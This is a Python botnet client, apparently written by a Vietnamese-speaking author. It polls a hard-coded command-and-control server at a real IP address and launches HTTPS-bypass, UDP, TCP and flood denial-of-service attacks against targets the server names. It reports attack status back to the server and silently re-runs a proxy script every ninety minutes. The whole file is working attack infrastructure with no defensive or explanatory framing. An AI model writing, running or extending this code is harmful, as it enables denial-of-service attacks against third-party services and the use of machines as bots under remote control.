import requests
import time
import subprocess
import threading

SERVER = "http://112.213.91.214:2009"

def report_status(status, command=None):
    try:
        requests.post(f"{SERVER}/report", json={"status": status, "command": command}, timeout=5)
    except:
        pass

def poll():
    while True:
        try:
            res = requests.get(f"{SERVER}/get_command", timeout=5).json()
            action = res.get("action")

            if action in ["bypass", "udp", "tcp", "https", "flood"]:
                url = res.get("url")
                port = res.get("port")
                duration = res.get("time", 60)

                if action == "https":
                    cmd = ["node", "bypass.js", "GET", url, str(duration), "245", "90", "vn.txt", "--query", "1", "--http", "2", "--full", "--winter"]
                elif action == "udp":
                    cmd = ["python3", "udp.py", url, str(port), str(duration), "2000", "500"]
                elif action == "tcp":
                    cmd = ["python3", "udp.py", url, str(port), str(duration), "2000", "500"]
                elif action == "bypass":
                    cmd = ["node", "bypass.js", "GET", url, str(duration), "80", "90", "vn.txt", "--query", "1", "--http", "2", "--full", "--winter"]
                elif action == "flood":
                    cmd = ["node", "flood.js", url, str(duration), "20", "90"]
                else:
                    cmd = []

                if cmd:
                    print(f"[BOT] Running {action} -> {' '.join(cmd)}")
                    report_status("running", res)

                    subprocess.Popen(cmd)
                    time.sleep(duration)

                    print("[BOT] Attack finished, entering cooldown...")
                    report_status("cooldown", None)
                    time.sleep(10)

                    report_status("idle", None)
            else:
                report_status("idle", None)

        except Exception as e:
            print(f"[BOT] Error: {e}")
            report_status("error", {"msg": str(e)})

        time.sleep(5)

def run_proxy_loop():
    while True:
        print("[BOT] Auto-running proxy.py ...")
        # Chạy proxy nhưng không in log/banner ra terminal
        subprocess.Popen(
            ["python3", "1.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(90 * 60)

if __name__ == "__main__":
    # Thread 1: Poll server
    t1 = threading.Thread(target=poll, daemon=True)
    t1.start()

    # Thread 2: Auto run proxy.py mỗi 1h30
    t2 = threading.Thread(target=run_proxy_loop, daemon=True)
    t2.start()

    # Giữ main thread sống
    t1.join()
    t2.join()

    

